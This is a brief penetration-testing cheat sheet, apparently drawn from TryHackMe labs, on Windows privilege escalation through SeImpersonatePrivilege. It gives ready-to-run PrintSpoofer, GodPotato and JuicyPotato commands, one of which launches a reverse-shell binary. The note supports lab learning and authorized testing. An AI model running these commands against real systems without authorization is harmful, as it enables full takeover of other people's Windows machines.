---
tags: [privesc]
tools: []
ports: []
os: [windows]
phase: [privesc]
---
# Privesc - Windows token impersonation

**TL;DR:** If `whoami /priv` shows **SeImpersonatePrivilege** or **SeAssignPrimaryTokenPrivilege** enabled, a Potato-family exploit turns it into SYSTEM. Service accounts (IIS `iis apppool\*`, MSSQL) have SeImpersonate by default — the classic web-shell-to-SYSTEM.

from: TryHackMe Windows PrivEsc / PrivEsc Arena — verified vs common Windows LPE references

## When to use

`whoami /priv` → SeImpersonatePrivilege = Enabled. Very common after popping a web app or SQL service.

## How (pick by OS version)

```cmd
:: Modern Windows 10/Server 2019+ : PrintSpoofer or GodPotato
PrintSpoofer.exe -i -c cmd
GodPotato -cmd "cmd /c whoami"

:: Older (pre-Server 2019): JuicyPotato with a CLSID
JuicyPotato.exe -l 1337 -p rev.exe -t * -c {CLSID}
```

## Gotchas

- **JuicyPotato is dead on Server 2019 / Win10 1809+** — use PrintSpoofer / GodPotato / RoguePotato there.
- Check the privilege is **Enabled**, not just Present.

## Related

- [[Privesc - Windows enumeration]], [[Privesc - Windows services]]
